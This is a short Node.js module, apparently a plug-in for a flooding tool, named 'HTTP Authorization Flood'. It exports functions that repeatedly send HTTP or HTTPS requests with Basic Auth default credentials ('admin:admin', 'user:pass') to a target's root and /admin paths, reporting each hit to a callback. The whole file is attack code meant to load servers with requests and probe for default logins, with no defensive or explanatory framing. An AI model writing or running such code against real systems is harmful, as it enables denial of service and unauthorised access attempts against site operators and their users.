const http = require('http');
const https = require('https');

module.exports = {
    name: 'HTTP Authorization Flood',
    description: 'Requests with Basic Auth',
    
    execute: async (target, port) => {
        const protocol = port === 443 ? https : http;
        const auth = 'Basic ' + Buffer.from('user:pass').toString('base64');
        
        return new Promise((resolve, reject) => {
            const req = protocol.request({
                hostname: target,
                port: port,
                path: '/admin',
                method: 'GET',
                headers: { 'Authorization': auth }
            }, (res) => {
                resolve({ status: res.statusCode });
                req.destroy();
            });
            
            req.end();
            req.on('error', reject);
        });
    },
    
    flood: (target, port, callback) => {
        const protocol = port === 443 ? https : http;
        const auth = 'Basic ' + Buffer.from('admin:admin').toString('base64');
        
        const req = protocol.request({
            hostname: target,
            port: port,
            path: '/',
            headers: { 'Authorization': auth }
        }, (res) => {
            res.resume();
            req.destroy();
            callback(true);
        });
        
        req.end();
        req.on('error', () => callback(false));
    }
};